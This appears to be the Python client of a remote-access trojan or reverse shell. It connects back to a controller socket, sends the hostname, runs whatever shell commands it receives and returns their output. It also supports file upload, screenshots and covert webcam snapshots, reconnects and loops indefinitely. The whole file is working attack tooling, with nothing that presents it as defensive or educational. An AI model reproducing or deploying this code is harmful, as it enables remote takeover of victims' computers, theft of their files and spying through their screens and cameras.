import os
import socket
import subprocess
import time
import signal
import sys
import struct
import commands
from cv2 import cv2
import pyscreenshot as ImageGrab

command_lookup = {
    "download": commands.upload,
    "capturing": commands.screenshot_cli,
    "snap": commands.webcam_cli
}

class Client(object):

    # the needed variables
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 9999
        self.socket = None

    # create a socket
    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    # connect to a remote socket
    def socket_connect(self):
        try:
            self.socket.connect((self.host, self.port))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    # this function is very handy
    def print_output(self, output_str):
        """ Prints command output """
        sent_message = str.encode(output_str + str(os.getcwd()) + '::> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return

    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(10)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return

        cwd = str.encode(str(os.getcwd()) + '::> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'': break

            try:
                output_str = command_lookup[data[:].decode("utf-8")](self.socket)
            except:
                if data[:2].decode("utf-8") == 'cd':
                    # e.g. cd dir
                    # "cd" = args[:2] and "dir" = args[3:]
                    directory = data[3:].decode("utf-8")
                    try: #chdir to wanted directory
                        os.chdir(directory.strip())
                    except Exception as e: # normally if it doesn't exist
                        output_str = "Could not change directory: %s\n" %str(e)
                    else: 
                        output_str = ""
                
                elif data[:].decode("utf-8") == 'quit':
                    self.socket.close()
                    break

                elif len(data) > 0:
                    try:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                        output_str = output_bytes.decode("utf-8", errors="replace")
                    except Exception as e:
                        # TODO: Error description is lost
                        output_str = "Command execution unsuccessful: %s\n" %str(e)
            finally: 
                if output_str is not None:
                    try:
                        self.print_output(output_str)
                    except Exception as e:
                        print('Cannot send command output: %s' %str(e))
        
        self.socket.close()
        return


def main():
    client = Client()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break    
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()
